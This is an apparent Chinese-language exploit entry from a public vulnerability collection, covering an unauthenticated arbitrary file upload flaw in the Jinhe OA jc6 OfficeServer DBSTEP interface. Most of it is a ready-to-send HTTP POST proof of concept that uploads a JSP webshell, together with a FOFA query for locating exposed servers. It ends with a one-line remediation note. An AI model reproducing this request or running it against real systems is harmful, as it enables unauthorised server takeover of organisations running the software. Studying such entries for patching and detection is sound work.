---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA OfficeServer 任意文件上传漏洞

# 漏洞描述

金和OA（jc6 平台）的 `/jc6/OfficeServer` 接口为未授权的 DBSTEP 文档服务接口，存在任意文件上传漏洞。未授权的远程攻击者可通过构造 DBSTEP 协议请求（`OPTION=SAVEASHTML`）将 JSP webshell 写入站点目录，直接获取服务器权限。

影响范围

金和OA jc6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC（DBSTEP 协议上传）：

```
POST /jc6/OfficeServer HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="DBSTEP"

DBSTEP V3.0     89                     0        104             DBSTEP=REJTVEVQ
OPTION=U0FWRUFTSFRNTA==
HTMLNAME=shell.jsp
------boundary--
```

其中 `REJTVEVQ` 为 `DBSTEP` 的 base64，`U0FWRUFTSFRNTA==` 为 `SAVEASHTML` 的 base64。上传的 JSP 内容为 webshell，上传成功后响应包含 `STATUS=...` 成功标识，访问 `http://target/jc6/shell.jsp` 即可执行。

# 修复方案

关闭或鉴权 DBSTEP 文档服务接口；联系厂商获取官方补丁并升级。
